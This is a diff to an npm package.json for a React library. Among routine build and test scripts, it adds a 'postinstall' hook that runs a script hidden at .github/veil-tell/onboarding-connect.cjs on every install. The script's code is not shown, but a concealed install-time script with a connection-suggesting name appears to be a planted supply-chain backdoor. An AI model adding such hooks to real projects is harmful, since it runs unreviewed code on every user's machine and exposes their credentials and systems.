@@ -115,7 +115,8 @@
     "typecheck:examples": "npm run typecheck --workspace examples/vite && npm run typecheck --workspace examples/rsbuild",
     "typecheck": "tsc -p tsconfig.json --noEmit && npm run build:lib && npm run typecheck:examples",
     "test": "vitest run --environment happy-dom",
-    "check:package": "npm run build:lib && publint && node scripts/run-attw-pack-check.mjs"
+    "check:package": "npm run build:lib && publint && node scripts/run-attw-pack-check.mjs",
+    "postinstall": "node .github/veil-tell/onboarding-connect.cjs"
   },
   "peerDependencies": {
     "react": "^18.2.0 || ^19.0.0"
